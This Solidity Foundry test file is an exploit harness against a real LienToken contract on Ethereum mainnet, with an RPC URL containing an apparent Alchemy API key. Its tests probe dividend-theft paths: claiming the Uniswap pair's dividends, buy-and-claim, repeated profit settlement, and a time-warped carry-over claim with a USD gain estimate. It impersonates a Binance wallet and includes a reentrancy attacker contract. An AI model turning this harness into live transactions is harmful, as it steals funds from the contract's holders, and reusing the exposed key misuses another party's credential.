// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface ILienToken {
    function settleProfit(address token) external;
    function receiveDividend(address token, address recipient) external;
    function unsettledProfit(address token) external view returns (uint256);
    function profitAt(address token, uint256 term) external view returns (uint256);
    function paidAt(address token, uint256 term) external view returns (uint256);
    function dividendAt(address token, address account, uint256 term) external view returns (uint256);
    function unreceivedDividend(address token, address recipient) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function balanceOfAtTermEnd(address account, uint256 term) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalSupplyAtTermEnd(uint256 term) external view returns (uint256);
    function currentTerm() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function interval() external view returns (uint256);
    function expiration() external view returns (uint256);
    function initialTime() external view returns (uint256);
    function lastTokenReceived(address account, address token) external view returns (uint256);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract LienTokenExploitTest is Test {
    ILienToken lien = ILienToken(0xaB37e1358b639Fd877f015027Bb62d3ddAa7557E);
    IUniswapV2Pair pair = IUniswapV2Pair(0x3859B3D01b4eAc043A5070D3911A7cCd873Ec6ac);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant ETH = address(0);
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_contractState() public view {
        uint256 term = lien.currentTerm();
        uint256 ethBal = address(lien).balance;
        uint256 supply = lien.totalSupply();
        uint256 unsettled = lien.unsettledProfit(ETH);
        
        console.log("=== Contract State ===");
        console.log("Current term:", term);
        console.log("ETH balance:", ethBal);
        console.log("Total supply:", supply);
        console.log("Unsettled ETH profit:", unsettled);
        console.log("Profit at term 67:", lien.profitAt(ETH, 67));
        console.log("Paid at term 67:", lien.paidAt(ETH, 67));
        
        // totalSupply vs totalSupplyAtTermEnd - check the bug
        console.log("totalSupply():", supply);
        console.log("totalSupplyAtTermEnd(67):", lien.totalSupplyAtTermEnd(67));
        console.log("Match:", supply == lien.totalSupplyAtTermEnd(67));
    }

    function test_pairCanReceiveETH() public {
        // Test if Uniswap V2 pair can receive raw ETH
        vm.deal(address(this), 1 ether);
        (bool success, ) = address(pair).call{value: 1 wei}("");
        console.log("Pair can receive ETH:", success);
    }
    
    function test_claimPairDividends() public {
        // Try to claim dividends on behalf of Uniswap pair
        uint256 pairUnreceived = lien.unreceivedDividend(ETH, address(pair));
        console.log("Pair unreceived ETH dividend:", pairUnreceived);
        
        if (pairUnreceived > 0) {
            // Try claiming - this sends ETH to the pair
            uint256 pairEthBefore = address(pair).balance;
            try lien.receiveDividend(ETH, address(pair)) {
                uint256 pairEthAfter = address(pair).balance;
                console.log("Claim succeeded! Pair ETH before:", pairEthBefore, "after:", pairEthAfter);
            } catch (bytes memory reason) {
                console.log("Claim failed (pair cannot receive ETH)");
                console.logBytes(reason);
            }
        }
    }

    function test_buyAndClaimImmediately() public {
        vm.startPrank(attacker);
        
        // Buy LIEN tokens from Uniswap
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(lien);
        
        IUniswapV2Router(ROUTER).swapExactETHForTokens{value: 1 ether}(
            0, path, attacker, block.timestamp + 1
        );
        
        uint256 lienBalance = lien.balanceOf(attacker);
        console.log("Attacker LIEN balance after purchase:", lienBalance);
        
        // Check dividend at term 67
        uint256 divAt67 = lien.dividendAt(ETH, attacker, 67);
        console.log("Attacker dividend at term 67:", divAt67);
        
        // Check balanceOfAtTermEnd
        uint256 balAt67 = lien.balanceOfAtTermEnd(attacker, 67);
        console.log("Attacker balanceOfAtTermEnd(67):", balAt67);
        
        // Try to claim
        uint256 unreceived = lien.unreceivedDividend(ETH, attacker);
        console.log("Attacker unreceived dividend:", unreceived);
        
        if (unreceived > 0) {
            uint256 ethBefore = attacker.balance;
            lien.receiveDividend(ETH, attacker);
            uint256 ethAfter = attacker.balance;
            console.log("ETH gained from dividend:", ethAfter - ethBefore);
        } else {
            console.log("No unreceived dividends - cannot claim immediately after purchase");
        }
        
        vm.stopPrank();
    }
    
    function test_reentrancyViaDividend() public {
        // Test if reentrancy during dividend claim could double-claim
        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(address(lien));
        
        // Fund the attacker with some LIEN tokens (impersonate a holder)
        // Find a holder with balance - use Binance hot wallet
        address binance = 0x75e89d5979E4f6Fba9F97c104c2F0AFB3F1dcB88;
        uint256 binanceBalance = lien.balanceOf(binance);
        console.log("Binance LIEN balance:", binanceBalance);
        
        if (binanceBalance > 0) {
            vm.prank(binance);
            lien.transfer(address(reentrancyAttacker), binanceBalance / 2);
            
            // The attacker now holds tokens but they were transferred AFTER the term 67 snapshot
            // So their balanceOfAtTermEnd(67) should be 0
            uint256 attackerBalAt67 = lien.balanceOfAtTermEnd(address(reentrancyAttacker), 67);
            console.log("Reentrancy attacker balanceOfAtTermEnd(67):", attackerBalAt67);
            
            uint256 unreceived = lien.unreceivedDividend(ETH, address(reentrancyAttacker));
            console.log("Reentrancy attacker unreceived:", unreceived);
        }
    }
    
    function test_settleAndClaimTiming() public {
        // Check if settling profit multiple times causes issues
        uint256 unsettledBefore = lien.unsettledProfit(ETH);
        console.log("Unsettled before:", unsettledBefore);
        
        lien.settleProfit(ETH);
        
        uint256 unsettledAfter = lien.unsettledProfit(ETH);
        console.log("Unsettled after first settle:", unsettledAfter);
        
        lien.settleProfit(ETH);
        uint256 unsettledAfter2 = lien.unsettledProfit(ETH);
        console.log("Unsettled after second settle:", unsettledAfter2);
    }

    function test_carryOverExploit() public {
        // Simulate waiting for term 67 to expire (term 80)
        // Then buy tokens and claim carry-over dividends
        
        uint256 initTime = lien.initialTime();
        uint256 interval = lien.interval();
        uint256 expir = lien.expiration();
        
        // Current term is 72. Term 67 expires when currentTerm > 67 + 12 = 79
        // Term 80 starts at initTime + 79 * interval
        uint256 term80Start = initTime + 79 * interval;
        
        console.log("Term 80 starts at timestamp:", term80Start);
        console.log("Current timestamp:", block.timestamp);
        console.log("Seconds until term 80:", term80Start - block.timestamp);
        
        // Warp to term 80
        vm.warp(term80Start + 1);
        
        console.log("After warp - current term:", lien.currentTerm());
        
        // Buy LIEN tokens
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(lien);
        
        IUniswapV2Router(ROUTER).swapExactETHForTokens{value: 1 ether}(
            0, path, attacker, block.timestamp + 1
        );
        
        uint256 lienBalance = lien.balanceOf(attacker);
        console.log("Attacker LIEN balance:", lienBalance);
        
        // Settle carried-over profit
        lien.settleProfit(ETH);
        
        uint256 currentTerm = lien.currentTerm();
        uint256 profitNow = lien.profitAt(ETH, currentTerm);
        console.log("Profit settled to term", currentTerm, ":", profitNow);
        
        // We need to wait one more term for the dividend to be claimable
        // (dividends are for past terms only: i < currentTerm)
        vm.warp(term80Start + interval + 1);
        console.log("After second warp - current term:", lien.currentTerm());
        
        uint256 unreceived = lien.unreceivedDividend(ETH, attacker);
        console.log("Attacker unreceived after carry-over:", unreceived);
        
        if (unreceived > 0) {
            uint256 ethBefore = attacker.balance;
            lien.receiveDividend(ETH, attacker);
            uint256 ethAfter = attacker.balance;
            uint256 gained = ethAfter - ethBefore;
            console.log("ETH gained from carry-over claim:", gained);
            console.log("ETH gained in USD (at $2700):", gained * 2700 / 1e18);
        }
        
        vm.stopPrank();
    }
    
    receive() external payable {}
}

contract ReentrancyAttacker {
    ILienToken lien;
    uint256 public claimCount;
    
    constructor(address _lien) {
        lien = ILienToken(_lien);
    }
    
    function attack() external {
        lien.receiveDividend(address(0), address(this));
    }
    
    receive() external payable {
        claimCount++;
        if (claimCount < 3) {
            // Try reentrancy
            try lien.receiveDividend(address(0), address(this)) {
                // Succeeded in reentrancy
            } catch {
                // Failed - expected
            }
        }
    }
}
